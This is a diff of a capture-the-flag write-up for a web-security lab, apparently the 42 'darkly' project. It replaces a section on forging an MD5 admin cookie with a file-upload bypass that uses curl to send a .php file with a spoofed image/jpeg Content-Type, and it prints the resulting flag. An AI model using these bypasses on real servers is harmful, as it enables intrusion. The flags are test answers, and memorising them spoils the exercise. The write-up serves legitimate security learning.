@@ -6,20 +6,26 @@ Once you click `Browse` button, you will be able to locate the file wish to uplo
 <img width="1038" alt="image" src="https://user-images.githubusercontent.com/46742040/202015491-9553f16f-c6dc-4b2c-b6d9-c1a84ce4856e.png">
 (A screenshot where image is uploaded with no `jpeg` extension)
 
+<img width="1021" alt="image" src="https://user-images.githubusercontent.com/46742040/202015974-04c11238-a64c-472b-a20b-43f59046f518.png">
+(A screenshot where the sample image with file name `image.jpeg` is uploaded)
+
+On curl, there is an option to upload a file with changing `Content-Type` header. 
+
+<img width="1503" alt="image" src="https://user-images.githubusercontent.com/46742040/202016708-958e4101-7ae1-4d5b-b034-0866bcf9a9ee.png">
+(A screenshot from `man curl`, explaining `-F` flag)
+
+so let's try following
 
 ```
-Set-Cookie
-I_am_admin=68934a3e9455fa72420237eb05902327; expires=Mon, 07-Nov-2022 16:25:44 GMT; Max-Age=3600
+touch /tmp/test.php
+# -F "Upload=Upload" was provided from inside the <form> tag
+curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/test.php;type=image/jpeg" http://{IP_ADDR}/index.php?page=upload
+```
+will give an output
+```
+...
+<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
+...
 ```
 
-[A quick search](https://md5hashing.net/hash/md5/68934a3e9455fa72420237eb05902327) shows that reverse of MD5 hash digest equals to the string `false`.
-
-MD5 hash digest of the string `true`
-```shell
-┌──$ [~/42/2022/darkly]
-└─>  echo -n "true" | md5
-b326b5062b2f0e69046810717534cb09
-```
-
-Changing value of saved cookie and refreshing the page gives the flag.
-
+the vulnerbility that could occur is uploaded script files `php, asp, jsp, etc.` that contains malacious code is harmful.
